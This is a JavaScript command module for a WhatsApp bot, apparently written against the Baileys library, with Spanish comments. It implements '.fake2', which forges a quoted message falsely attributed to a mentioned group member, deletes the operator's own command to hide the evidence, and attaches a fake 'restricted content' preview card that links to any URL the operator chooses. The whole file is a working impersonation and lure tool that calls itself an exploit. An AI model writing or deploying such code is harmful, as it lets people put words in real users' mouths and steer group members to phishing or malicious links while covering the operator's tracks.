export default {
    name: 'suplantacion_cita_v2',
    match: (text) => /^\.fake2\s+/i.test(text),
    execute: async ({ sock, remitente, msg, textoLimpio }) => {
        
        const isGroup = remitente.endsWith('@g.us');
        if (!isGroup) return sock.sendMessage(remitente, { text: "❌ Este exploit solo tiene sentido en grupos." }, { quoted: msg });

        const mentionedJid = msg.message.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
        if (!mentionedJid) return sock.sendMessage(remitente, { text: "❌ Menciona a la víctima. Ej: .fake2 @user texto falso | reacción | url" });

        // Limpieza de comando y menciones
        const rawInput = textoLimpio.replace(/^\.fake2\s+/i, '').replace(/@\d+/g, '').trim();
        
        // Variables por defecto
        let textoFalso = rawInput;
        let reaccion = "como?"; 
        let urlTrampa = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; // Rickroll clásico por defecto

        // Lógica de separación de los 3 parámetros
        const parts = rawInput.split('|').map(p => p.trim());
        if (parts.length > 0 && parts[0]) textoFalso = parts[0];
        if (parts.length > 1 && parts[1]) reaccion = parts[1];
        if (parts.length > 2 && parts[2]) urlTrampa = parts[2];
        
        if (!textoFalso) return sock.sendMessage(remitente, { text: "❌ Escribe el texto que quieres falsificar." });

        try {
            // 1. Destrucción de evidencia en modo sigilo
            try { await sock.sendMessage(remitente, { delete: msg.key }); } catch (e) {}

            // 2. Construcción de la cita fantasma
            const mensajeInyectado = {
                key: {
                    fromMe: false,
                    participant: mentionedJid,
                    id: "3EB0" + Date.now().toString(16).toUpperCase()
                },
                message: { conversation: textoFalso }
            };

            // 3. Ejecución: Fusión de Cita Falsa + Exploit ExternalAdReply
            await sock.sendMessage(remitente, { 
                text: reaccion,
                contextInfo: {
                    // Aquí ocurre la magia del redireccionamiento visual
                    externalAdReply: {
                        title: "⚠️ CONTENIDO RESTRINGIDO",
                        body: "Toca para ver el archivo adjunto",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        // Imagen de error abstracta/negra para incitar el toque
                        thumbnailUrl: "https://i.imgur.com/vHq0AUN.jpeg", 
                        sourceUrl: urlTrampa
                    }
                }
            }, { 
                quoted: mensajeInyectado 
            });

        } catch (err) {
            console.error("Error Fake Quote V2:", err);
            await sock.sendMessage(remitente, { text: `❌ Fallo crítico en inyección: ${err.message}` });
        }
    }
};
